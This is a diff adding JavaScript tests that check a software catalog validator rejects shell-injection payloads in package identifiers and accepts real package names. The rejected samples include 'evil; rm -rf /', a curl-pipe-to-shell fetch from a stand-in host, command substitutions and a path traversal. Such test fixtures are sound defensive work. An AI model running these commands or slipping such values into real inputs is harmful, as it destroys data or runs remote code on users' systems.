@@ -250,3 +250,49 @@ test('validateCatalog accepts ordinary binary names', () => {
     assert.deepEqual(validateCatalog([app({ verify: { binary } })]), [], binary);
   }
 });
+
+test('validateCatalog rejects an installation identifier that could reach a shell', () => {
+  // The identifier is the *other* catalog field interpolated into a generated
+  // command. `renderPlan` re-checks it against the same alphabet and refuses to
+  // build a command — but only at plan time, as a thrown error on a user's
+  // request. Catching it here makes bad data a validation failure instead, which
+  // is what the catalog test suite and the `/health` integrity check can see.
+  for (const identifier of [
+    'evil; rm -rf /',
+    'evil && curl http://x/y | sh',
+    '$(whoami)',
+    '`id`',
+    'pkg | sh',
+    'two words',
+    '../../bin/sh',
+    '-rf',
+    'pkg\nother',
+  ]) {
+    const errors = validateCatalog([
+      app({ installation: [{ method: 'apt', identifier, origin: 'distro', distros: ['Ubuntu'] }] }),
+    ]);
+    assert.ok(
+      errors.length > 0,
+      `expected identifier ${JSON.stringify(identifier)} to be rejected`,
+    );
+  }
+});
+
+test('validateCatalog accepts every identifier form the catalog actually uses', () => {
+  // Package names with dots and pluses, reverse-DNS Flatpak ids, Snap names.
+  for (const identifier of [
+    'git',
+    'docker.io',
+    'docker-ce',
+    'g++',
+    'org.mozilla.firefox',
+    'com.visualstudio.code',
+    'sublime-text',
+    'firefox-esr',
+  ]) {
+    const errors = validateCatalog([
+      app({ installation: [{ method: 'flatpak', identifier, origin: 'vendor' }] }),
+    ]);
+    assert.deepEqual(errors, [], `expected ${identifier} to be accepted`);
+  }
+});
